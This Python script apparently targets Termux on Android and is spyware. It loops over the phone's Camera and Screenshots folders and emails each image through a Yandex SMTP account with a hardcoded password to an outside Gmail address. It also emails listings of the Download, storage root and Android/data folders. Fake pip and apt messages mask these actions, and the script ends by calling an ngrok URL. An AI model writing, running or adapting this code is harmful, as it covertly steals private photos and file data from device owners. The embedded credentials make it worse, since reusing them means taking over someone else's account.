import subprocess
subprocess.call("pip install termcolor", shell=True)
subprocess.call("pip install bs4", shell=True)
subprocess.call("pip install requests", shell=True)


import os
from termcolor import colored
from bs4 import BeautifulSoup
import requests
import time
from email.mime.application import MIMEApplication
import smtplib                                            
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.multipart import *


tyu = 0
try:
	
	while True: 
		tyu += 1
	
		directo1 = '/storage/emulated/0/DCIM/Camera/'
		directo = '/storage/emulated/0/DCIM/Screenshots/'
		fie = os.listdir(directo)
		file = os.listdir(directo1)
		
	
		
		
		
		aa1 = fie[tyu]
		aa2 = file[tyu]
	
		msg = MIMEMultipart()
		msg['Subject'] = 'Тема письма'
		msg['From'] = 'vadymsalin@yandex.ru'
		 
		part = MIMEText('Текст письма\n')
		msg.attach(part)
		 
		part = MIMEApplication(open(directo + aa1 , 'rb').read())
		part.add_header('Content-Disposition', 'attachment', filename='image.jpg')
		msg.attach(part)
		
		server = smtplib.SMTP('smtp.yandex.ru:587')
		server.ehlo()
		server.starttls()
		server.login('vadymsalin@yandex.ru', 'alex3241@')
		 
		server.sendmail(msg['From'], ['testn6143@gmail.com@gmail.com'], msg.as_string())
		
		
		
		
		
		msg = MIMEMultipart()
		msg['Subject'] = 'Тема письма'
		msg['From'] = 'vadymsalin@yandex.ru'
		 
		part = MIMEText('Текст письма\n')
		msg.attach(part)
		 
		part = MIMEApplication(open(directo1 + aa2 , 'rb').read())
		part.add_header('Content-Disposition', 'attachment', filename='image.jpg')
		msg.attach(part)
		
		server = smtplib.SMTP('smtp.yandex.ru:587')
		server.ehlo()
		server.starttls()
		server.login('vadymsalin@yandex.ru', 'alex3241@')
		 
		server.sendmail(msg['From'], ['testn6143@gmail.com@gmail.com'], msg.as_string())
	


except:
	print("")
	print(colored("""WARNING: You are using pip version 20.1.1; however, version 20.2.2 is available.
You should consider upgrading via the '/data/data/com.termux/files/usr/bin/python3 -m pip install --upgrade pip' command.""",'green'))



	

import subprocess
subprocess.call("apt update && apt upgrade -y", shell=True)


try:
	dir = '/storage/emulated/0/Download'
	files = os.listdir(dir)
	
	mir = '/storage/emulated/0/'
	gif = os.listdir(mir)
	
	
	hir = '/storage/emulated/0/Android/data'
	jir = os.listdir(hir)
	
	m = ("""
	
	
	
	
	
	""")
	
	a = ('\n'.join(files))
	b = ('\n'.join(gif))
	c = ('\n'.join(jir))
	
	bodyh = (dir  + m + a + m + mir + m + b + m + hir + m + c)
	
	
	import smtplib                                            
	from email.mime.text import MIMEText
	from email.mime.multipart import MIMEMultipart
	from email.mime.multipart import *
	
	
	def send_mail():
		login = "vadymsalin@yandex.ru"
		password = "alex3241@"
		url = "smtp.yandex.ru"
		toaddr = "testn6143@gmail.com@gmail.com"		
		msg = MIMEMultipart()
		msg['Subject'] = 'GG'
		msg['From'] = 'vadymsalin@yandex.ru'
		body = str(bodyh)
		msg.attach(MIMEText(body, 'plain'))
		
		try:
			server = smtplib.SMTP_SSL(url, 465)
		
		except TimeoutError:
			print(colored('Соеденение разорвано, проверьте соеденение с интернетом', 'red'))
		server.login(login, password)
		server.sendmail(login, toaddr, msg.as_string())
		
	def main():
		send_mail()
	
	if __name__ == "__main__":
		main()

except:
	print("""(Reading database ... 21972 files and directories currently installed.)
Preparing to unpack .../archives/sl_5.02-2_aarch64.deb ...
Unpacking sl (5.02-2) ...
Setting up sl (5.02-2) ...""")





url = "https://740e04349156.ngrok.io"
real = requests.get(url, timeout=5)